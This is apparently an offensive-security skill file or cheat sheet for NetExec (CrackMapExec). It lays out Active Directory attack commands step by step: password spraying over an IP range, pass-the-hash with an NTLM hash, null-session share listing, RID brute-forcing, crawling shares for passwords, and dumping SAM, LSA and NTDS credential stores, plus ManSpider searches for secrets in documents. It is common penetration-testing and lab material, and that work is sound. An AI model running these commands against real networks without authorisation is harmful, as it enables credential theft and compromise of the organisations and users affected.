---
name: crackmapexec
description: "NetExec (formerly CrackMapExec): SMB, WinRM, and LDAP enumeration, password spraying, and file spidering across Active Directory."
---

# crackmapexec (NetExec)

**Goal**: Validate credentials, enumerate shares, spray passwords, and spider SMB shares across Windows networks.

> **Note**: CrackMapExec (`cme`) is officially deprecated. Modern versions are branded as **NetExec** (`nxc`). The syntax remains identical (`nxc smb` instead of `cme smb`).

## 1. Authentication and Protocol Flags

NetExec supports multiple protocols (`smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`).
- `-u` Username, `-p` Password.
- `-d` Domain (Use `-d ''` or `--local-auth` for local SAM accounts).
- `-H` Pass-The-Hash (NTLM).

```bash
# Basic SMB auth check against an IP range
nxc smb 10.10.10.0/24 -u 'user' -p 'password'

# Local Authentication Check
nxc smb 10.10.10.50 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c' --local-auth
```
*Note*: If you see `STATUS_LOGON_FAILURE`, the creds are bad. If you see `(Pwn3d!)`, you have Administrative privileges over that endpoint.

## 2. Deep SMB Enumeration (0xdf Workflows)

When searching for data on open file shares:

### Null Session & Anonymous Enum
Attempt to list shares without any valid credentials.
```bash
nxc smb 10.10.10.50 -u 'guest' -p '' --shares
```

### RID Cycling
If you have a guest or null session, you can bruteforce RIDs to extract the full list of Local/Domain Users.
```bash
nxc smb 10.10.10.50 -u 'guest' -p '' --rid-brute
```

### Share Spidering (`spider_plus` Module)
If you have valid credentials and found readable shares, `spider_plus` will recursively crawl the shares and dump a JSON tree of all filenames, allowing you to `grep` for passwords or config files offline without downloading terabytes of ISOs.
```bash
nxc smb 10.10.10.50 -u 'user' -p 'pass' -M spider_plus
```
*(Results are saved to `/tmp/spider_plus/` or `~/.nxc/workspaces/`).*

### Extracting Secrets
If the terminal outputs `Pwn3d!`, you can immediately dump credentials from the host.
```bash
nxc smb 10.10.10.50 -u 'user' -p 'pass' --sam
nxc smb 10.10.10.50 -u 'user' -p 'pass' --lsa
nxc smb 10.10.10.50 -u 'user' -p 'pass' --ntds
```

## 3. Alternative: ManSpider

If `nxc -M spider_plus` is too noisy or you need to specifically search *inside* document contents (Word, Excel, PDF) instead of just filenames, use **ManSpider**.
```bash
manspider 10.10.10.50 -u 'user' -d 'domain.local' -p 'pass' -f 'password' 'secret' 'api_key'
```
